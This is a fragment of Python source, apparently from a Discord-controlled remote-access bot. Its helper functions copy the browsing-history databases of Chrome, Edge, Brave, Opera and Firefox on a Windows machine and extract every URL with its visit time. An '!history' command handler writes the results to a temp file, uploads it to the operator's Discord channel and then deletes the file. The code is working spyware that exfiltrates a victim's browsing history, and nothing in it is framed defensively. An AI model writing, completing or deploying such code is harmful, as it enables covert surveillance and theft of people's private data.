...
# history gathering helpers (borrowed from bot1)
import shutil
...
def _get_chrome_like_history(base_dir, browser_name):
    ...
    try:
        ...
        for entry in os.listdir(base_dir):
            profiles.append(os.path.join(base_dir, entry))
        # include Default if not already
        if os.path.isdir(os.path.join(base_dir, 'Default')):
            profiles.append(os.path.join(base_dir, 'Default'))
        for profile in profiles:
            ...
            try:
                ...
                cur = conn.cursor()
                # fetch url and last visit time, order by latest
                cur.execute("SELECT url, last_visit_time FROM urls ORDER BY last_visit_time DESC")
                rows = cur.fetchall()
                conn.close()
                for url, lv in rows:
                    # convert Chrome timestamp (microseconds since 1601-01-01)
                    try:
                        dt = datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=lv)
                        ts = dt.strftime("%Y-%m-%d %H:%M:%S")
                    except Exception:
                        ts = "?"
                    results.append(f"{ts} - {url}")
            except Exception:
                pass
            finally:
                try:
...
def _get_firefox_history():
    ...
    try:
        ...
        if not os.path.isdir(firefox_dir):
            return results
        for sub in os.listdir(firefox_dir):
            profile = os.path.join(firefox_dir, sub)
            ...
            try:
                ...
                conn = sqlite3.connect(tmp)
                cur = conn.cursor()
                cur.execute("SELECT url, last_visit_date FROM moz_places ORDER BY last_visit_date DESC")
                rows = cur.fetchall()
                conn.close()
                for url, lv in rows:
                    try:
                        dt = datetime.datetime.fromtimestamp(lv/1e6)
                        ts = dt.strftime("%Y-%m-%d %H:%M:%S")
                    except Exception:
                        ts = "?"
                    results.append(f"{ts} - {url}")
...
def get_all_history():
    history = {}
    local = os.getenv('LOCALAPPDATA') or ''
    history['Chrome'] = _get_chrome_like_history(os.path.join(local, 'Google', 'Chrome', 'User Data'), 'Chrome')
    history['Edge'] = _get_chrome_like_history(os.path.join(local, 'Microsoft', 'Edge', 'User Data'), 'Edge')
    history['Brave'] = _get_chrome_like_history(os.path.join(local, 'BraveSoftware', 'Brave-Browser', 'User Data'), 'Brave')
    history['Opera'] = _get_chrome_like_history(os.path.join(local, 'Opera Software'), 'Opera')
    history['Firefox'] = _get_firefox_history()
...
async def on_message(message):
    if message.channel.name != channel_name:
        ...
        if message.content == "!history":
            # gather browsing history from all common browsers
            hist = get_all_history()
            if hist:
                # format as sections per browser
                temp_dir = os.getenv('TEMP')
                out_path = os.path.join(temp_dir, "history_all.txt")
                try:
                    with open(out_path, 'w', encoding='utf-8', errors='ignore') as f:
                        for browser, urls in hist.items():
                            f.write(f"=== {browser} ===\n")
                            for url in urls:
                                f.write(url + "\n")
                            f.write("\n")
                    file = discord.File(out_path, filename="history.txt")
                    await message.channel.send("[*] Command successfuly executed", file=file)
                except Exception:
                    await message.channel.send("[!] Failed to gather or send history.")
                finally:
                    try:
                        os.remove(out_path)
                    except Exception:
